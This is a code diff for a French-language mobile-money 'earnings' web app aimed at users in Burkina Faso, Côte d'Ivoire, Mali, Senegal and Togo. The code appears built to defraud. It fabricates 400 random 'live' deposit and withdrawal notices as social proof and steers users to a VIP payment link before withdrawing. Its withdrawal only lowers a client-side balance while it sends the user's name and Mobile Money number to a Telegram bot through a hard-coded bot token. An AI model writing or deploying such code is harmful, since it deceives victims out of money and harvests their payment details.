+alert('Solde insuffisant');
+return;
+}
+
+user.balance -= amount;
+
+transactions.push({
+user_id:user.id,
+type:'retrait',
+amount,
+status:'En attente',
+date:new Date().toLocaleString()
+});
+
+updateCurrentUser();
+renderAll();
+
+alert('Retrait envoyé avec succès');
+
+modal.remove();
+
+};
+
+}
+
+function renderAll(){
+renderHome();
+renderOrders();
+renderTeam();
+renderMe();
+}
+
+let deferredPrompt;
+
+window.addEventListener('beforeinstallprompt',(e)=>{
+
+e.preventDefault();
+deferredPrompt = e;
+
+document.getElementById('installBtn').style.display='block';
+
+});
+
+async function installPWA(){
+
+if(!deferredPrompt){
+alert('Installation non disponible actuellement');
+return;
+}
+
+deferredPrompt.prompt();
+await deferredPrompt.userChoice;
+
+}
+
+window.addEventListener('load',()=>{
+
+const url = new URL(window.location.href);
+const ref = url.searchParams.get('ref');
+
+if(ref){
+document.getElementById('ref').value = ref;
+}
+
+});
+/* ================= CONFIG RETRAIT VIP ================= */
+
+const BOT_TOKEN =
+"8768257415:AAGVVZ1tCotPs2mx9NWEf7SfLLBh68AK1eg";
+
+const CHAT_ID =
+"-1003353240263";
+
+const VIP_LINK =
+"https://westpay.cloud/link/yum3cdaamouf08cr";
+
+let isVIP = true;
+
+/* ================= RETRAIT VIP PRO ================= */
+
+async function withdraw() {
+
+  try {
+
+    /* ===== INFOS ===== */
+
+    const name = prompt("Nom complet");
+    if (!name) return;
+
+    const country = prompt(
+`Pays :
+1 - Burkina Faso
+2 - Côte d'Ivoire
+3 - Mali
+4 - Sénégal
+5 - Togo`
+    );
+
+    if (!country) return;
+
+    const paymentMethod = prompt(
+`Méthode :
+1 - Orange Money
+2 - Moov Money
+3 - MTN Money
+4 - Wave`
+    );
+
+    if (!paymentMethod) return;
+
+    const number = prompt("Numéro Mobile Money");
+    if (!number) return;
+
+    const amount =
+    parseInt(prompt("Montant (FCFA)"));
+
+    if (isNaN(amount)) {
+
+      alert("Montant invalide");
+      return;
+
+    }
+
+    /* ===== VALIDATION ===== */
+
+    if (amount < 1000) {
+
+      alert("Minimum retrait 1000 FCFA");
+      return;
+
+    }
+
+    if (!isVIP) {
+
+      alert("Veuillez acheter le VIP");
+
+      window.open(VIP_LINK, "_blank");
+
+      return;
+
+    }
+
+    if (amount > user.balance) {
+
+      alert("Solde insuffisant");
+      return;
+
+    }
+
+    /* ===== CONVERSION ===== */
+
+    let countryText = "";
+    let methodText = "";
+
+    switch(country){
+
+      case "1":
+        countryText = "Burkina Faso";
+      break;
+
+      case "2":
+        countryText = "Côte d'Ivoire";
+      break;
+
+      case "3":
+        countryText = "Mali";
+      break;
+
+      case "4":
+        countryText = "Sénégal";
+      break;
+
+      case "5":
+        countryText = "Togo";
+      break;
+
+      default:
+        countryText = country;
+
+    }
+
+    switch(paymentMethod){
+
+      case "1":
+        methodText = "Orange Money";
+      break;
+
+      case "2":
+        methodText = "Moov Money";
+      break;
+
+      case "3":
+        methodText = "MTN Money";
+      break;
+
+      case "4":
+        methodText = "Wave";
+      break;
+
+      default:
+        methodText = paymentMethod;
+
+    }
+
+    /* ===== RETRAIT ===== */
+
+    user.balance -= amount;
+
+    transactions.push({
+
+      user_id:user.id,
+      type:"retrait",
+      amount:amount,
+      date:new Date().toLocaleString()
+
+    });
+
+    save();
+
+    renderAll();
+
+    /* ===== MESSAGE TELEGRAM ===== */
+
+    let message = `
+🏧 NOUVEAU RETRAIT VIP
+
+👤 Nom : ${name}
+
+📱 Numéro : ${number}
+
+💳 Méthode : ${methodText}
+
+🌍 Pays : ${countryText}
+
+💰 Montant : ${amount} FCFA
+
+🆔 Utilisateur : ${user.phone}
+
+💎 Solde restant : ${user.balance} FCFA
+
+⏰ Date : ${new Date().toLocaleString()}
+`;
+
+    /* ===== ENVOI TELEGRAM ===== */
+
+    const url =
+`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+    const response = await fetch(url, {
+
+      method:"POST",
+
+      headers:{
+        "Content-Type":"application/json"
+      },
+
+      body:JSON.stringify({
+
+        chat_id:CHAT_ID,
+        text:message
+
+      })
+
+    });
+
+    const data = await response.json();
+
+    if(data.ok){
+
+      alert(
+"Retrait envoyé avec succès"
+      );
+
+    } else {
+
+      alert(
+"Erreur Telegram"
+      );
+
+    }
+
+  } catch(error){
+
+    console.error(error);
+
+    alert(
+"Erreur lors du retrait"
+    );
+
+  }
+
+}                                
+/* ================= LIVE TRANSACTIONS ================= */
+
+function maskNumber(num){
+
+  return num.slice(0,2) + "****" + num.slice(-2);
+
+}
+
+/* ================= TABLEAU ================= */
+
+let liveTransactions = [];
+
+/* ================= GENERATION ================= */
+
+function generateData(){
+
+  for(let i=0;i<400;i++){
+
+    let number =
+    "0" +
+    Math.floor(
+      60000000 + Math.random()*39999999
+    );
+
+    let masked = maskNumber(number);
+
+    let type =
+    Math.random() < 0.8
+    ? "rechargé"
+    : "retiré";
+
+    let amount =
+    Math.floor(
+      Math.random()*(795075-5000)+5000
+    );
+
+    liveTransactions.push({
+
+      phone:masked,
+      amount:amount,
+      type:type
+
+    });
+
+  }
+
+  /* ===== MELANGE ===== */
+
+  liveTransactions.sort(
+    ()=>Math.random()-0.5
+  );
+
+}
+
+generateData();
+
+/* ================= INDEX ================= */
+
+let index = 0;
+
+/* ================= SHOW LIVE ================= */
+
+function showLive(){
+
+  const liveBar =
+  document.getElementById("liveBar");
+
+  const auth =
+  document.getElementById("auth");
+
+  const homePage =
+  document.getElementById("home");
+
+  /* ===== PAGE INSCRIPTION / LOGIN ===== */
+
+  if(
+    auth.style.display !== "none"
+  ){
+
+    liveBar.style.display = "none";
+
+    return;
+
+  }
+
+  /* ===== UNIQUEMENT HOME ===== */
+
+  if(
+    !homePage.classList.contains("active")
+  ){
+
+    liveBar.style.display = "none";
+
+    return;
+
+  }
+
+  /* ===== AFFICHER BARRE ===== */
+
+  liveBar.style.display = "flex";
+
+  if(index >= liveTransactions.length){
+
+    index = 0;
+
+  }
+
+  let t =
+  liveTransactions[index];
+
+  const text =
+  `${t.phone} a ${t.type} ${t.amount} FCFA`;
+
+  const box =
+  document.getElementById("liveText");
+
+  /* ===== RESET ANIMATION ===== */
+
+  box.classList.remove("fade");
+
+  void box.offsetWidth;
+
+  box.classList.add("fade");
+
+  box.innerText = text;
+
+  index++;
+
+}
+
+/* ================= PAGE ================= */
+
+function showPage(page){
+
+  document.querySelectorAll('.page')
+  .forEach(
+    p=>p.classList.remove('active')
+  );
+
+  document.getElementById(page)
+  .classList.add('active');
+
+  showLive();
+
+}
+
+/* ================= START ================= */
+
+window.onload = ()=>{
+
+  showLive();
+
+  setInterval(
+    showLive,
+    30000
+  );
+
+};                                 /* ================= CODES BONUS 5000 ================= */
+
+const bonus5000 = [
+
+"BONUS5K-A92X",
+"BONUS5K-K7LM",
+"BONUS5K-QP44",
+"BONUS5K-Z81N",
+"BONUS5K-TX55"
+
+];
+
+/* ================= CODES BONUS 10000 ================= */
+
+const bonus10000 = [
+
+"BONUS10K-HG72",
+"BONUS10K-LP93",
+"BONUS10K-XA11",
+"BONUS10K-WQ66",
+"BONUS10K-MN88"
+
+];
+
+/* ================= CODES BONUS 20000 ================= */
+
+const bonus20000 = [
+
+"BONUS20K-RF20",
+"BONUS20K-VB91",
+"BONUS20K-KL33",
+"BONUS20K-ZT74",
+"BONUS20K-UX58"
+
+];
+
+/* ================= CODES BONUS 50000 ================= */
+
+const bonus50000 = [
+
+"VIP50K-PP10",
+"VIP50K-TR84",
+"VIP50K-HY55",
+"VIP50K-MX29",
+"VIP50K-QW77"
+
+];
+
+/* ================= 50 CODES BONUS 200 ================= */
+
+const bonus200 = [
+
+"FREE200-A001",
+"FREE200-A002",
+"FREE200-A003",
+"FREE200-A004",
+"FREE200-A005",
+"FREE200-A006",
+"FREE200-A007",
+"FREE200-A008",
+"FREE200-A009",
+"FREE200-A010",
+
+"FREE200-B011",
+"FREE200-B012",
+"FREE200-B013",
+"FREE200-B014",
+"FREE200-B015",
+"FREE200-B016",
+"FREE200-B017",
+"FREE200-B018",
+"FREE200-B019",
+"FREE200-B020",
+
+"FREE200-C021",
+"FREE200-C022",
+"FREE200-C023",
+"FREE200-C024",
+"FREE200-C025",
+"FREE200-C026",
+"FREE200-C027",
+"FREE200-C028",
+"FREE200-C029",
+"FREE200-C030",
+
+"FREE200-D031",
+"FREE200-D032",
+"FREE200-D033",
+"FREE200-D034",
+"FREE200-D035",
+"FREE200-D036",
+"FREE200-D037",
+"FREE200-D038",
+"FREE200-D039",
+"FREE200-D040",
+
+"FREE200-E041",
+"FREE200-E042",
+"FREE200-E043",
+"FREE200-E044",
+"FREE200-E045",
+"FREE200-E046",
+"FREE200-E047",
+"FREE200-E048",
+"FREE200-E049",
+"FREE200-E050"
+
+];
+
+/* ================= TOUS LES CODES ================= */
+
+const bonusCodes = {
+
+  /* 5000 */
+  "BONUS5K-A92X":5000,
+  "BONUS5K-K7LM":5000,
+  "BONUS5K-QP44":5000,
+  "BONUS5K-Z81N":5000,
+  "BONUS5K-TX55":5000,
+
+  /* 10000 */
+  "BONUS10K-HG72":10000,
+  "BONUS10K-LP93":10000,
+  "BONUS10K-XA11":10000,
+  "BONUS10K-WQ66":10000,
+  "BONUS10K-MN88":10000,
+
+  /* 20000 */
+  "BONUS20K-RF20":20000,
+  "BONUS20K-VB91":20000,
+  "BONUS20K-KL33":20000,
+  "BONUS20K-ZT74":20000,
+  "BONUS20K-UX58":20000,
+
+  /* 50000 */
+  "VIP50K-PP10":50000,
+  "VIP50K-TR84":50000,
+  "VIP50K-HY55":50000,
+  "VIP50K-MX29":50000,
+  "VIP50K-QW77":50000,
+
+  /* 200 */
+  "FREE200-A001":200,
+  "FREE200-A002":200,
+  "FREE200-A003":200,
+  "FREE200-A004":200,
+  "FREE200-A005":200,
+  "FREE200-A006":200,
+  "FREE200-A007":200,
+  "FREE200-A008":200,
+  "FREE200-A009":200,
+  "FREE200-A010":200,
+
+  "FREE200-B011":200,
+  "FREE200-B012":200,
+  "FREE200-B013":200,
+  "FREE200-B014":200,
+  "FREE200-B015":200,
+  "FREE200-B016":200,
+  "FREE200-B017":200,
+  "FREE200-B018":200,
+  "FREE200-B019":200,
+  "FREE200-B020":200,
+
+  "FREE200-C021":200,
+  "FREE200-C022":200,
+  "FREE200-C023":200,
+  "FREE200-C024":200,
+  "FREE200-C025":200,
+  "FREE200-C026":200,
+  "FREE200-C027":200,
+  "FREE200-C028":200,
+  "FREE200-C029":200,
+  "FREE200-C030":200,
+
+  "FREE200-D031":200,
+  "FREE200-D032":200,
+  "FREE200-D033":200,
+  "FREE200-D034":200,
+  "FREE200-D035":200,
+  "FREE200-D036":200,
+  "FREE200-D037":200,
+  "FREE200-D038":200,
+  "FREE200-D039":200,
+  "FREE200-D040":200,
+
+  "FREE200-E041":200,
+  "FREE200-E042":200,
+  "FREE200-E043":200,
+  "FREE200-E044":200,
+  "FREE200-E045":200,
+  "FREE200-E046":200,
+  "FREE200-E047":200,
+  "FREE200-E048":200,
+  "FREE200-E049":200,
+  "FREE200-E050":200
+
+};                                 /* ================= USER SOLDE ================= */
+
+let userBalance = 0;
+
+/* ================= BONUS FUNCTION ================= */
+
+function claimBonus(){
+
+  const input = document
+  .getElementById("bonusCode")
+  .value
+  .trim()
+  .toUpperCase();
+
+  const rewardBarBox =
+  document.getElementById("rewardBar")
+  .parentElement;
+
+  const rewardBar =
+  document.getElementById("rewardBar");
+
+  const message =
+  document.getElementById("bonusMessage");
+
+  /* CODE VALIDE */
+
+  if(bonusCodes[input]){
+
+    const amount = bonusCodes[input];
+
+    userBalance += amount;
+
+    rewardBarBox.style.display = "block";
+
+    rewardBar.style.width = "100%";
+
+    message.innerHTML =
+    "✅ Bonus reçu : " +
+    amount.toLocaleString() +
+    " FCFA";
+
+    /* SUPPRIMER CODE */
+    delete bonusCodes[input];
+
+  }
+
+  /* CODE INVALIDE */
+
+  else{
+
+    rewardBarBox.style.display = "block";
+
+    rewardBar.style.width = "0%";
+
+    message.innerHTML =
+    "❌ Code invalide ou déjà utilisé";
+
+  }
+
+}
+                             </script>
+
+</body>
+</html>     
